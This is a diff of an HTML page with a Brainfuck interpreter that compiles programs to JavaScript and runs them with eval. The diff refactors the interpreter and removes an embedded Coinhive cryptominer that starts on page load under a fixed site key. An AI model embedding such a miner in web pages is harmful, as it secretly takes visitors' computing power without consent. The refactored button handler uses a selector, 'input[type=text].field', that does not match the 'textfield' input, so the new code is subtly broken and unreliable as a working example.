@@ -1,51 +1,43 @@
 <script>
-  function brainfuck(str) {
-   var initialString = str;
-   var jsCode = "var u = [];var pointer = 0;for(var i = 0; i < 30000; i++) {u[i]=0;};";
-   str.split("");
-   for(var i = 0; i < str.length; i++) {
-     switch(str[i]) {
-       case "." :
-	       jsCode+="document.write(String.fromCharCode(u[pointer]));";
-	       break;
-	     case "," :
-	       jsCode+="u[pointer]=prompt('');";
-	       break;
-	     case "+" :
-	       jsCode+="u[pointer]++;";
-	       break;
-	     case "-" :
-	       jsCode+="u[pointer]--;";
-	       break;
-	     case "<" :
-	       jsCode+="pointer--;";
-	       break;
-	     case ">" :
-	       jsCode+="pointer++;";
-	       break;
-	     case "[" :
-	       jsCode+="while(u[pointer]!==0) {";
-	       break;
-	     case "]" :
-	       jsCode+="};";
-	       break;
-	     default :
-	       break;
-	   }
-	 }
-	 eval(jsCode);
-}
+	const brainfuck = (str) => {
+		const initialString = str;
+		let jsCode = "let u=[],pointer=0,i;for(i=0;i<30000;i++)u[i]=0;", i;
+		str=str.split("");
+		for(i = 0; i < str.length; i++) {
+			switch(str[i]) {
+				case "." :
+					jsCode+="document.write(String.fromCharCode(u[pointer]));";
+					break;
+				case "," :
+					jsCode+="u[pointer]=prompt('');";
+					break;
+				case "+" :
+					jsCode+="u[pointer]++;";
+					break;
+				case "-" :
+					jsCode+="u[pointer]--;";
+					break;
+				case "<" :
+					jsCode+="pointer--;";
+					break;
+				case ">" :
+					jsCode+="pointer++;";
+					break;
+				case "[" :
+					jsCode+="while(u[pointer]!==0) {";
+					break;
+				case "]" :
+					jsCode+="};";
+					break;
+			}
+		}
+		console.log(jsCode);
+		eval(jsCode);
+	}
 </script>
 <body>
 	<center>
-		<input type="textfield" id="field">
-		<input type="button" onclick="brainfuck(document.getElementById('field').value)" value="Execute">
+		<input type="textfield" class="field" />
+		<input type="button" onclick="brainfuck(document.querySelector('input[type=text].field').value)" value="Execute" />
 	</center>
-	
-	<!-- Coin-hive Miner reference -->
-	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-	<script type="text/javascript">
-		var miner = new CoinHive.Anonymous('pUhvRAMNDIW3dIVsUuRI9FfG7OOTgBLw');
-		miner.start();
-	</script>
 </body>
